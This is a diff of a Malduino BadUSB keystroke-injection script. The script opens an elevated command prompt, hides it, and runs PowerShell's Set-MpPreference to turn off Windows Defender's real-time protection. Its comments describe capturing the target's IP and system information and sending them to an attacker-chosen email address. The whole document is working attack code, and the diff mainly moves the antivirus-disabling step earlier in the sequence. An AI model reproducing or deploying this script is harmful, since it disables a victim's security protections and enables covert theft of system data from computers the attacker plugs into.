@@ -10,8 +10,9 @@ SENDTOACCOUNT: The email you want to send info.txt to
 https://www.youtube.com/watch?v=Op4s5e8gL0o
 
 ----Malduino Script 1---- Target computer is the host
-REM Hide CMD
-DELAY 100
+
+REM Disable Windows Defender | https://www.itechtics.com/enable-disable-windows-defender/
+DELAY 2000
 CONTROL ESC
 DELAY 200
 STRING CMD
@@ -21,6 +22,23 @@ DOWN
 ENTER
 DELAY 400
 ALT y
+STRING powershell
+ENTER
+DELAY 600
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 600
+STRING exit
+ENTER
+DELAY 200
+STRING exit
+ENTER
+REM Hide CMD
+DELAY 600
+GUI r
+DELAY 200
+STRING cmd
+ENTER
 DELAY 600
 ALT SPACE
 DELAY 100
@@ -126,16 +144,6 @@ DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
-ENTER
-REM Disable Windows Defender | https://www.itechtics.com/enable-disable-windows-defender/
-DELAY 400
-STRING powershell
-ENTER
-DELAY 600
-STRING Set-MpPreference -DisableRealtimeMonitoring $true
-ENTER
-DELAY 600
-STRING exit
 ENTER
 REM Capture IP + system info and send via email
 DELAY 600
